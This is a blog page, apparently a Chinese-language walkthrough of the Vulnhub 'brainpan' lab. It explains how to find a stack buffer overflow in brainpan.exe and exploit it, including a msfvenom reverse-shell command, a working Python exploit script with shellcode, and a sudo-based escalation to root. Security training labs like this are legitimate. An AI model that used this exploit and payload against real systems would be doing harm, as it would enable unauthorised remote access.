@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-17brainpan | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-17brainpan</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;19:19:51</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.111.140</span>     nmap --min-rate <span class="number">100000</span> -p9999,<span class="number">10000</span> -A <span class="number">192.168.111.140</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.111.140:10000</span>   dirb  http://<span class="number">192.168.111.140:10000</span>/      nikto -host <span class="number">192.168.111.140</span> -p <span class="number">10000</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-17brainpan//image-20241122192514634.png" alt="image-20241122192514634"></p>
+<p>能看到9999端口访问不了也不知道运行的什么服务，10000端口是web服务，里面放了一个图片，同时用dirsearch,dirb,nikto扫一下10000端口,都扫到了&#x2F;bin</p>
+<p><img src="/vulnhub-17brainpan//image-20241122194321671.png" alt="image-20241122194321671"></p>
+<p>访问后发现&#x2F;bin&#x2F;目录就放了一个brainpan.exe文件，这就是提示，提示我们要对这个brainpan.exe进行分析</p>
+<p><img src="/vulnhub-17brainpan//image-20241123095019557.png" alt=" windows 的可执行文件"></p>
+<p>现在大概明白9999端口怎么用了。需要用nc连接  nc ip port    注意不加：</p>
+<p><img src="/vulnhub-17brainpan//image-20241123095731104.png" alt="image-20241123095731104"></p>
+<p><img src="/vulnhub-17brainpan//image-20241122194443015.png" alt="image-20241122194443015"></p>
+<p>尝试用IDA pro进行分析，需要用32位的。研究好久，这个太难为我了，看不懂了，参考一下其他师傅的吧</p>
+<p><img src="/vulnhub-17brainpan//image-20241122195053785.png" alt="image-20241122195053785"></p>
+<p>正片开始： 这个靶场要用Windows的PWN 洞来getshell</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">缓冲区溢出（<span class="keyword">buffer</span> overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</span><br><span class="line"></span><br><span class="line">项目十七：brainpan-<span class="number">1</span>，专门考验缓冲区溢出知识，该项目仅仅开放了<span class="number">10000</span>端口作为web端，经过简单的目录爆破就能发现存在brainpan.<span class="keyword">exe</span>文件，该项目是乌班图环境并且安装了win的模块运行着<span class="keyword">exe</span>文件，该文件启动了<span class="number">9999</span>端口支撑服务，该环境就和AWD中的PWN题目一样，直播教学会有多种方法详细解释如何理解缓冲区溢出，如何发现缓冲区溢出，遇到缓冲区溢出如何利用，栈是什么等等问题详解。</span><br><span class="line"></span><br><span class="line">看了一大圈大概明白了，这个靶机是用Linux搭建的，但是通过这个<span class="keyword">exe</span>文件运行了一个Windows服务，我们只要运行这个<span class="keyword">exe</span>文件，就能模仿出靶机运行的服务，如果能在本地调试出payload，在靶机中也能使用。</span><br><span class="line"></span><br><span class="line">我们需要下载一个软件 immunity debugger（id）(漏洞挖掘+恶意软件分析),在这里我推荐从这里下载，能汉化</span><br><span class="line">https://www.xue51.<span class="keyword">com</span>/soft/<span class="number">4770</span>.html#xzdz</span><br><span class="line"></span><br><span class="line">有师傅通过<span class="keyword">python</span> brainfuzzer.<span class="keyword">py</span> <span class="number">192.168</span>.<span class="number">111.140</span> <span class="number">9999</span> ////来检查是否有缓冲区溢出，检查<span class="number">9999</span>端口，就是那个我们不知道具体用途的端口</span><br><span class="line">这一步的目的是借助批量产生的无意义的字符来冲击文件，可以得知是否存在溢出的可能</span><br><span class="line">https://github.<span class="keyword">com</span>/jessekurrus/brainpan 这里有脚本地址</span><br></pre></td></tr></table></figure>
+
+<p>现在模拟本地环境，打开immunity debugger，然后点击文件，把exe导入进去，再点开始，此时我们就能看到在我们本地开了一个等待被连接的9999端口</p>
+<p><img src="/vulnhub-17brainpan//image-20241122202721262.png" alt="image-20241122202721262"></p>
+<p><img src="/vulnhub-17brainpan//image-20241122202756210.png" alt="image-20241122202756210"></p>
+<p>但是在这里我本地搭建的环境跑不起来，我通过<code>netstat -ano | findstr :9999</code>  查看到PIN为2072的程序在占用9999端口，system启动的</p>
+<p><img src="/vulnhub-17brainpan//image-20241123094735719.png" alt="image-20241123094735719"></p>
+<p><img src="/vulnhub-17brainpan//image-20241122203407584.png" alt="image-20241122203407584"></p>
+<p>还是继续看靶机的环境吧     这里我们看到字符数到1300以上就中断服务了，那也就是说1300以上就能溢出，同时在immunityDebugger的第一个框也会停止</p>
+<p><img src="/vulnhub-17brainpan//image-20241123104653334.png" alt="靶机的环境也不是很稳定"></p>
+<p><img src="/vulnhub-17brainpan//222616929.png" alt="这里是程序开启界面，需要点击右箭头图标才可运行程序"></p>
+<p>msfconsole：  locate pattern_create.rb &#x2F;&#x2F;找一下pattern_create.rb，生成1300位可以反查的字符  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class="number">1300</span>   但是不行，看了别的师傅，他们都是<span class="number">10000.</span>。。我也只好改成<span class="number">1000</span>  </span><br><span class="line">    </span><br><span class="line">    复制粘贴下来然后放法到brainpan1.py在运行   python2 brainpan1.py <span class="number">192.168</span><span class="number">.111</span><span class="number">.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-17brainpan//222616613.png" alt="在这里插入图片描述"></p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">到这就可以看到 EIP变成35724134 <span class="number"> 35 </span>72<span class="number"> 41 </span>34因为两个字节是一个字符，所以这样分开 然后计算机中内存的地址按照由低到高的顺序排列存放 也就是说放在最下面的是最先放的   那也就是说实际上的顺序是<span class="number"> 34 </span>41<span class="number"> 72 </span>35</span><br><span class="line">所以这一组EBP（基底地址）的第一组字节（第一个字符）应该是34，对应的ACSII也就是4Ar5  --通过查找前面生成的1000位反查字符也能知道是在524位</span><br><span class="line"></span><br><span class="line">继续来到msfconsole通过 locate pattern_offset.rb  //找一下pattern_offset.rb ，/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q<span class="number"> 35724134 </span>   ---反查溢出点   溢出点在524位</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-17brainpan//0c66cc6b2ba4f8894b907963e455d5dd.png" alt="对照ASCII表找出字符是:4Ar5"></p>
+<p><img src="/vulnhub-17brainpan//image-20241123105542394.png" alt="image-20241123105542394"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看<span class="keyword">shellcode空间大小--思路： </span>将<span class="keyword">EIP修改为shellcode代码的内存地址，将shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到shellcode代码段并执行，接下来将寻找可存放shellcode的内存空间是多少！ </span>也就是说  <span class="number">524</span>个字节填满他正常的内存空间，而后就会造成溢出，用<span class="keyword">B填满他的指向（四个字符），剩下整这么多C就是shellcode的内存可存放大小，借助工具我们就可以知道shellcode可以放多少字节（也就是说我们要知道他最终的内存中保留下来了多少C）</span></span><br><span class="line"><span class="keyword"></span>python2 <span class="keyword">brainpan2.py </span><span class="number">192</span>.<span class="number">168</span>.<span class="number">111</span>.<span class="number">140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-17brainpan//image-20241123110559772.png" alt="这样修改brainpan2.py"></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们这就看到了，查找ASCII表知道了<span class="built_in">EIP</span>均被B覆盖，<span class="built_in">EBP</span>均被A覆盖，<span class="built_in">ESP</span>的位置右键 Follow <span class="keyword">in</span> dump在左下视图右键选择HEX-HEX/ASCII(<span class="number">16</span>)，选择<span class="number">16</span>个字节一行观察</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-17brainpan//222615591.png" alt="在这里插入图片描述"></p>
+<p><img src="/vulnhub-17brainpan//222613626.png" alt="起始位置005FF910 结束位置是005FFAE0"></p>
+<p><img src="/vulnhub-17brainpan//image-20241123111320585.png" alt="1D0  转换成10进制也就是464，可以放得下一个shellcode"></p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途：</span><br><span class="line"><span class="number">1</span><span class="string">\.</span> 返回地址、shellcode、buffer中都不能出现坏字符</span><br><span class="line"><span class="number">2</span><span class="string">\.</span> <span class="literal">null</span> byte (<span class="number">0x00</span>)空字符，用于终止字符串的拷贝操作</span><br><span class="line"><span class="number">3</span><span class="string">\.</span> <span class="keyword">return</span> (<span class="number">0x0D</span>)回车操作，表示POP3 PASS命令输入完成 </span><br><span class="line">因为在不同的协议，功能，等情况下，对于坏字符的敏感度不同，有些不管，有些要管，为了避免这个问题，我们就一刀切，全部排除坏字符</span><br><span class="line">发送<span class="number">0x00</span>–<span class="number">0xff</span> <span class="number">256</span>个字符，查找所有坏字符  python2 brainpan3.py <span class="number">192.168</span>.<span class="number">111.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-17brainpan//222616610.png" alt="在这里插入图片描述"></p>
+<p><img src="/vulnhub-17brainpan//222615605.png" alt="在这里插入图片描述"></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">从右往左读，发现均为正常显示，除了<span class="number">0x00</span>，因为无论何时何地，他都是坏字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">因为<span class="built_in">ESP</span>的地址会变化，这是系统的保护机制，所以我们要找一种可以精确的百分百定位到shellcode的东西，这个东西是<span class="keyword">JMP</span> <span class="built_in">ESP</span>  接着引入mona脚本（识别内存模块的脚本）!mona modules</span><br><span class="line">#### <span class="keyword">jmp</span> <span class="built_in">esp</span>定位</span><br><span class="line">利用nasm_shell<span class="number">.</span>rb查看<span class="keyword">jmp</span> <span class="built_in">esp</span>的地址！ locate nasm_shell   /usr/share/metasploit-framework/tools/exploit/nasm_shell<span class="number">.</span>rb nasm &gt; <span class="keyword">jmp</span> <span class="built_in">esp</span></span><br><span class="line"><span class="number">00000000</span>  FFE4  <span class="keyword">jmp</span> <span class="built_in">esp</span> </span><br><span class="line">右键搜索命令</span><br><span class="line">看到存在<span class="keyword">jmp</span> <span class="built_in">esp</span> ，它的地址是 311712F3</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/vulnhub-17brainpan//222613676.png" alt="在这里插入图片描述"></p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用mona脚本来查找当前文件中<span class="keyword">jmp</span> <span class="built_in">esp</span>的存在位置</span><br><span class="line"></span><br><span class="line">!mona find -s “\xff\xe4” -m brainpan<span class="number">.</span>exe</span><br><span class="line"></span><br><span class="line">得到结果如下 311712F3</span><br><span class="line">获得是<span class="keyword">JMP</span> <span class="built_in">ESP</span>地址 ：<span class="number">0x311712F3</span></span><br><span class="line"></span><br><span class="line">最上面ASLR等是保护机制，我们要找一个均是false的，往回看就是这个exe文件，在实际操作中也可能是DLL进程文件，具体问题具体分析</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-17brainpan//222615771.png" alt="在这里插入图片描述"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">生成linux的反弹shell</span><br><span class="line">msfvenom -p linux/x86/shell_reverse_tcp <span class="attribute">lhost</span>=192.168.111.128 <span class="attribute">lport</span>=8888 -b <span class="string">&quot;/x00&quot;</span>  -f c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">pyload</span>：</span><br><span class="line"><span class="keyword">import</span> <span class="variable">socket</span>,<span class="variable">time</span>,<span class="variable">sys</span></span><br><span class="line"><span class="variable">try</span>:</span><br><span class="line">    <span class="variable">client</span> <span class="operator">=</span> <span class="variable">socket</span>.<span class="property">socket</span>(<span class="variable">socket</span>.<span class="property">AF_INET</span>, <span class="variable">socket</span>.<span class="property">SOCK_STREAM</span>)</span><br><span class="line">    <span class="variable">client</span>.<span class="property">connect</span>((&#x27;<span class="number">192.168</span><span class="number">.111</span><span class="number">.140</span>&#x27;, <span class="number">9999</span>))</span><br><span class="line">    <span class="variable">buf</span> <span class="operator">=</span> (<span class="string">&quot;\xdb\xce\xd9<span class="char escape_">\x74</span><span class="char escape_">\x24</span>\xf4<span class="char escape_">\x58</span>\xbe<span class="char escape_">\x16</span><span class="char escape_">\x44</span><span class="char escape_">\x37</span><span class="char escape_">\x54</span><span class="char escape_">\x31</span>\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1<span class="char escape_">\x12</span><span class="char escape_">\x31</span><span class="char escape_">\x70</span><span class="char escape_">\x17</span><span class="char escape_">\x03</span><span class="char escape_">\x70</span><span class="char escape_">\x17</span><span class="char escape_">\x83</span>\xd6<span class="char escape_">\x40</span>\xd5\xa1\xe7&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x93</span>\xee\xa9<span class="char escape_">\x54</span><span class="char escape_">\x67</span><span class="char escape_">\x42</span><span class="char escape_">\x44</span><span class="char escape_">\x58</span>\xee<span class="char escape_">\x85</span><span class="char escape_">\x28</span>\x3a\x3d\xc5&quot;</span></span><br><span class="line"><span class="string">&quot;\xda\x9b\x0d\xf9<span class="char escape_">\x11</span>\x9b<span class="char escape_">\x27</span>\x7f<span class="char escape_">\x53</span>\xf3<span class="char escape_">\x77</span>\xd7\xcc<span class="char escape_">\x83</span>&quot;</span></span><br><span class="line"><span class="string">&quot;<span class="char escape_">\x10</span>\x2a<span class="char escape_">\x13</span>\xa1<span class="char escape_">\x58</span>\xa3\xf2<span class="char escape_">\x15</span>\xfe\xe4\xa5<span class="char escape_">\x06</span>\x4c<span class="char escape_">\x07</span>&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf<span class="char escape_">\x49</span>\x7f<span class="char escape_">\x88</span>\x9d\xe1\xee\xa6<span class="char escape_">\x52</span><span class="char escape_">\x99</span><span class="char escape_">\x86</span><span class="char escape_">\x97</span>\xbb\x3b&quot;</span></span><br><span class="line"><span class="string">&quot;\x3e<span class="char escape_">\x61</span><span class="char escape_">\x20</span>\xe9<span class="char escape_">\x93</span>\xf8<span class="char escape_">\x46</span>\xbd\x1f<span class="char escape_">\x36</span><span class="char escape_">\x08</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;<span class="char escape_">\x41</span>&quot;</span><span class="operator">*</span><span class="number">524</span> <span class="operator">+</span> <span class="string">&quot;\xf3<span class="char escape_">\x12</span><span class="char escape_">\x17</span><span class="char escape_">\x31</span>&quot;</span><span class="operator">+</span> <span class="string">&quot;<span class="char escape_">\x90</span>&quot;</span><span class="operator">*</span><span class="number">50</span> <span class="operator">+</span> <span class="variable">buf</span> </span><br><span class="line">    <span class="variable">client</span>.<span class="property">send</span>(<span class="title function_">bytes</span>(<span class="variable">msg</span><span class="operator">+</span> <span class="string">&quot;<span class="char escape_">\r</span><span class="char escape_">\n</span>&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;[+] payload send successful&quot;</span>)</span><br><span class="line">    <span class="variable">client</span>.<span class="property">close</span>()</span><br><span class="line">    <span class="variable">time</span>.<span class="property">sleep</span>(<span class="number">5</span>)</span><br><span class="line"><span class="variable">except</span> :</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;连接终止&quot;</span>)</span><br><span class="line">    <span class="variable">sys</span>.<span class="property">exit</span>()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    分析一下这个<span class="variable">payload</span>：</span><br><span class="line"><span class="variable">JMP</span> <span class="variable">ESP</span> 内存地址：\<span class="variable">xf3</span>\<span class="variable">x12</span>\<span class="variable">x17</span>\<span class="variable">x31c</span></span><br><span class="line"><span class="number">1.524</span>个<span class="variable">A</span>用来覆盖掉正常的内存空间，</span><br><span class="line"><span class="number">2.</span>\<span class="variable">xf3</span>\<span class="variable">x12</span>\<span class="variable">x17</span>\<span class="variable">x31c</span>是<span class="variable">JMP</span> <span class="variable">ESP</span>的地址用来指向<span class="variable">shellcode</span>；</span><br><span class="line"><span class="number">3.</span>后面一大串整型乘\<span class="variable">x90</span>是去掉<span class="variable">nop</span>空地址（这一段相当于啥也没有，要去掉）</span><br><span class="line"><span class="number">4.</span>再加上<span class="variable">msf</span>生成的反弹<span class="variable">shell</span></span><br><span class="line">这个脚本要用<span class="variable">python3</span>运行</span><br></pre></td></tr></table></figure>
+
+<p>现在就getshell，获得交互式shel  <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>提权 <code>/home/anansi/bin/anansi_util</code>这个文件不需要密码可以用root权限运行</p>
+<p><img src="/vulnhub-17brainpan//image-20241123114029088.png" alt="image-20241123114029088"></p>
+<p>看起来这个anansi_util文件实际功能和vim、less差不多，尝试直接输入!&#x2F;bin&#x2F;bash进行提取</p>
+<p><img src="/vulnhub-17brainpan//image-20241123114626112.png" alt="image-20241123114626112"></p>
+<p><img src="/vulnhub-17brainpan//image-20241123114647202.png" alt="把root密码改成root就结束"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过nmap发现目标开放了9999、10000两个端口，通过对10000端口进行常规的web渗透测试，发现了在&#x2F;bin目录下有一个可执行文件。</p>
+<p>下载下来文件进行观察，发现这个文件就是运行在9999端口的服务，通过对缓冲区溢出漏洞的发现和利用，成功获得了系统立足点，利用sudo -l看到有一个可执行程序可以利用进行提权</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%89%93%E9%9D%B6/"># 打靶</a>
+                    
+                        <a href="../tags/PWN%E6%B4%9E%E5%AD%A6%E4%B9%A0/"># PWN洞学习</a>
+                    
+                        
